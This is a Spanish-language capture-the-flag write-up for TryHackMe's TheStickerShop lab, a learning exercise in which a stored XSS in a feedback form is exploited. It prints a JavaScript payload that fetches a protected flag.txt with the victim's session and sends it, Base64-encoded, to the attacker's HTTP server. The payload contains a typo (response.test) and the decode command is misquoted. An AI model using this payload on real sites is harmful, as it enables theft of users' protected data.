---
title: "TheStickerShop - Stored XSS Leading to Data Exfiltration"
tags:
  - TryHackMe
  - XSS
  - Stored-XSS
  - Data-Exfiltration
  - JavaScript-Exploitation
  - Web-Vulnerability
  - HTTP-Server-Exploitation
  - Linux-Exploitation
categories:
  - CTF-Writeup
  - Web-Exploitation
  - JavaScript-Exploitation
date: 2024-12-05
description: "Technical writeup detailing the compromise of TheStickerShop. The primary vulnerability exploited is a Stored Cross-Site Scripting (XSS) vulnerability found in the 'Feedback' form on the Python/Werkzeug web server (8080/tcp). The attack leverages a custom JavaScript payload to bypass a 401 Unauthorized error, fetch the restricted 'flag.txt' file, encode its content in Base64, and exfiltrate the data to an attacker-controlled HTTP server via an Image object request."
updated: 2025-11-25
abbrlink: tryhackme/thestickershop
--- 

![Lab TheStickerShop Yw4rf](thestickershop-tryhackme.png)

## Introduction

En este WriteUp de la máquina TheStickerShop de la plataforma de **[TryHackMe](https://tryhackme.com)** se analizó un servidor con los puertos **22/tcp (SSH)** y **8080/tcp (HTTP)** abiertos. Si bien no se detectaron vulnerabilidades en el servicio SSH, en el servidor web por otro lado se identificó una vulnerabilidad de **XSS (Cross-Site Scripting)** en el formulario de la sección `Feedback`, que permitió ejecutar código JavaScript malicioso en el navegador. Esto se explotó para realizar **data exfiltration** del archivo protegido `flag.txt`.

~~~
Platform: TryHackMe
Level: Easy
OS: Linux
~~~

## Reconnaissance

~~~
Target IP: 10.10.127.143
~~~

>  La tienda local de pegatinas finalmente ha desarrollado su propia página web. No tienen demasiada experiencia con respecto al desarrollo web, por lo que decidieron desarrollar y alojar todo en la misma computadora que usan para navegar por Internet y observar los comentarios de los clientes. ¡Movimiento inteligente!
> 
> Puedes leer la bandera en `http://10.10.127.143:8080/flag.txt`?

![sticker](sticker-0.png)

Comenzamos con el comando **ping**, que utiliza el **ICMP (Protocolo de Control de Mensajes de Internet)**. Este comando envía un mensaje de “echo request” a una dirección IP y espera recibir un mensaje de “echo response”. Este proceso permite verificar si una máquina en la red es accesible y medir la latencia. Además, se puede inferir que es una máquina **Linux** debido al **TTL = 63**

![sticker](sticker-1.png)

## Scanning

El paquete fue recibido correctamente por la máquina objetivo. Verificada la conexión, realizamos un escaneo de múltiples etapas con la herramienta **Nmap**. Primero, identificamos los puertos abiertos:

![sticker](sticker-2.png)

Se encontraron los puertos abiertos **22/tcp** y **8080/tcp**. A continuación, realizamos un escaneo más detallado utilizando la la flag `-sCV` para obtener más información de los puertos:

![sticker](sticker-3.png) 

## Enumeration

### 22/tcp SSH

El puerto **22/tcp** ejecuta el servicio `OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)`.

- No se identificaron vulnerabilidades conocidas en esta versión del servicio.
- Este puerto fue descartado como vector de ataque para esta etapa.

### 8080/tcp HTTP

El puerto **8080/tcp** aloja un servidor web identificado como `http-proxy Werkzeug/3.0.1 Python/3.9.10`.

- Al navegar a la URL principal, encontramos un sitio web dedicado a la venta de stickers de gatos.
- La página presenta dos secciones principales: `Home` y `Feedback`.

Al acceder a la sección `Home` no se observaron elementos interactivos relevantes ni indicios de vulnerabilidades explotables.

![sticker](sticker-4.png)

Al acceder a la sección `Feedback` se muestra un formulario que permite a los usuarios enviar comentarios.

![sticker](sticker-5.png)

Al intentar acceder a la URL `http://10.10.127.143:8080/flag.txt` devolvió un error **401 Unauthorized**, lo que indica que el acceso al archivo está restringido.

![sticker](sticker-6.png)

En el formulario de la sección `Feedback` exploramos posibles vulnerabilidades. En particular **Cross-Site Scripting (XSS)**, dado que los formularios son un vector común para este tipo de ataque.

En primer lugar, niciamos un servidor HTTP en el puerto **80** de nuestra máquina atacante para recibir posibles solicitudes: `sudo python3 -m http.server 80`

![sticker](sticker-7.png)

Luego, en el formulario de `Feedback`, enviamos el siguiente payload: `<img src="http://10.21.66.133/test">`. Este código intenta cargar una imagen desde nuestro servidor. Si el navegador del objetivo procesa el payload, el servidor HTTP recibiría una solicitud GET.

![sticker](sticker-8.png)

Al verificar el servidor de escucha, se observó una solicitud entrante, lo que confirma que el payload fue ejecutado exitosamente por el navegador de la víctima.

![sticker](sticker-9.png)

## Exploitation

Confirmada la vulnerabilidad, utilizamos un payload más avanzado para extraer el contenido del archivo `flag.txt` y enviarlo a nuestro servidor:

~~~JS
<script>
	fetch("/flag.txt", { method: 'GET', mode: 'no-cors', credentials: 'same-origin'})
		.then(response => response.test())
		.then(data => {
			let img = new Image();
			img.src = "http://10.21.66.133:80/" + btoa(data);
		});
</script>
~~~

- `fetch("/flag.txt", {...})`
    - Solicita el archivo `flag.txt` utilizando las credenciales de la sesión activa del navegador.
    - El modo `'no-cors'` evita restricciones relacionadas con políticas de origen cruzado, permitiendo que la solicitud sea procesada por el servidor.
- `.then(response => response.text())`
    - Convierte la respuesta obtenida (el contenido del archivo) en texto legible.
- `btoa(data)`
    - Codifica el texto en Base64 para evitar problemas al enviarlo como parte de una URL.
- `let img = new Image(); img.src = "http://10.21.66.133:80/" + btoa(data);`
    - Crea un objeto de imagen que realiza una solicitud GET a nuestro servidor con el contenido codificado como parte de la URL.
    - Este enfoque garantiza que los datos extraídos sean enviados a nuestro servidor incluso con restricciones de CORS.

![sticker](sticker-10.png)

Al ejecutar el payload, nuestro servidor recibió una solicitud con el contenido del archivo `flag.txt` codificado en Base64.

![sticker](sticker-11.png)

Decodificamos el contenido usando el siguiente comando: `echo "<TEXTO EN BASE64> | base64 --decode"`  

![sticker](sticker-12.png)

**ROOTED**